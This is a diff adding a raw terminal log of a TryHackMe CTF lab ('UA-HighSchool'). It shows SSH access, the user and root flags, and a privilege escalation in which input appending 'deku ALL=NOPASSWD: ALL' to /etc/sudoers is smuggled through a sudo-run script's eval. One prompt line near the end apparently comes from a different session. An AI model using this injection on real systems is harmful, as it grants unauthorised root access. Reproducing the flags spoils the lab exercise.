@@ -1,0 +1,142 @@
+┌──(sonar㉿Kali)-[/run/…/sonar/SANDISK/TryHackMe/UA-HighSchool]
+└─$ ssh deku@10.49.158.219  
+The authenticity of host '10.49.158.219 (10.49.158.219)' can't be established.
+ED25519 key fingerprint is: SHA256:W1zF5weENYyIoVbsJIkSeD7OzdqhW50tuha/rL0ig2c
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes'
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.49.158.219' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+deku@10.49.158.219's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri 24 Jul 2026 06:20:38 AM UTC
+
+  System load:  0.09              Processes:             119
+  Usage of /:   55.0% of 9.75GB   Users logged in:       0
+  Memory usage: 16%               IPv4 address for ens5: 10.49.158.219
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3
+deku@ip-10-49-158-219:~$ ls
+user.txt
+deku@ip-10-49-158-219:~$ cat user.txt 
+THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
+deku@ip-10-49-158-219:~$ sudo -l
+[sudo] password for deku: 
+Matching Defaults entries for deku on ip-10-49-158-219:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on ip-10-49-158-219:
+    (ALL) /opt/NewComponent/feedback.sh
+deku@ip-10-49-158-219:~$ cat /opt/NewComponent/feedback.sh
+#!/bin/bash
+
+echo "Hello, Welcome to the Report Form       "
+echo "This is a way to report various problems"
+echo "    Developed by                        "
+echo "        The Technical Department of U.A."
+
+echo "Enter your feedback:"
+read feedback
+
+
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+    echo "It is This:"
+    eval "echo $feedback"
+
+    echo "$feedback" >> /var/log/feedback.txt
+    echo "Feedback successfully saved."
+else
+    echo "Invalid input. Please provide a valid input." 
+fi
+
+deku@ip-10-49-158-219:~$ ls -la /opt/NewComponent/feedback.sh
+-r-xr-xr-x 1 deku deku 684 Jan 23  2024 /opt/NewComponent/feedback.sh
+deku@ip-10-49-158-219:~$ sudo /opt/NewComponent/feedback.sh
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+deku ALL=NOPASSWD: ALL >> etc/sudoers
+It is This:
+/opt/NewComponent/feedback.sh: line 14: etc/sudoers: No such file or directory
+Feedback successfully saved.
+deku@ip-10-49-158-219:~$ sudo -l
+Matching Defaults entries for deku on ip-10-49-158-219:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on ip-10-49-158-219:
+    (ALL) /opt/NewComponent/feedback.sh
+deku@ip-10-49-158-219:~$ sudo /opt/NewComponent/feedback.sh
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+deku ALL=NOPASSWD: ALL >> /etc/sudoers
+It is This:
+Feedback successfully saved.
+deku@ip-10-49-158-219:~$ sudo -l
+Matching Defaults entries for deku on ip-10-49-158-219:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on ip-10-49-158-219:
+    (ALL) /opt/NewComponent/feedback.sh
+    (root) NOPASSWD: ALL
+deku@ip-10-49-158-219:~$ sudo su
+root@ip-10-49-158-219:/home/deku# ls
+user.txt
+root@ip-10-49-158-219:/home/deku# cd /root
+root@ip-10-49-158-219:~# ls
+root.txt  snap
+root@ip-10-49-158-219:~# cat root.txt 
+root@myheroacademia:/opt/NewComponent# cat /root/root.txt
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                  _    _ 
+             _   _        ___    | |  | |
+            | \ | | ___  /   |   | |__| | ___ _ __  ___
+            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
+            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
+            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 
+
+THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
+
+root@ip-10-49-158-219:~# ^C
+root@ip-10-49-158-219:~# ^C
+root@ip-10-49-158-219:~# exit
+exit
+deku@ip-10-49-158-219:~$ exit
+logout
+Connection to 10.49.158.219 closed.
